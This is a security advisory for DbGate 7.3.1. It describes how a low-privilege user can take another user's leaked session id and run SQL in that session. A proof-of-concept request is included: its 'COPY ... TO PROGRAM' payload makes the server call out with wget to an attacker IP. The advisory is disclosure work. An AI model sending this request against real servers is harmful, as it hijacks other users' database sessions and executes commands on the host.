# Cross-user SQL execution through leaked session identifiers

Identifier: `GHSA-xgr5-jrwx-vc8m`

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```
Score: 8.8 (High).

Affected version: 7.3.1

## Description
This issue can be chained with [GHSA-297r-vfh5-2xqc](https://github.com/dbgate/dbgate/security/advisories/GHSA-297r-vfh5-2xqc), which exposes active database session identifiers through the unauthenticated /stream endpoint.

After obtaining another user's `sesid`, a low-privilege authenticated user can submit it to `/sessions/execute-query` using their own valid bearer token.

```html
POST /sessions/execute-query
Authorization: Bearer ATTACKER_TOKEN
Content-Type: application/json
```
```json
{
  "sesid": "VICTIM_SESID",
  "sql": "COPY (SELECT '') TO PROGRAM 'wget -qO- http://172.26.242.223:4444/pwned'",
  "autoCommit": false
}
```

The endpoint verifies that the requester is authenticated, but does not verify that the requester owns the referenced database session or connection.

## Demo

https://github.com/user-attachments/assets/186d6b9b-a561-47e0-802e-df9e98eb41d4

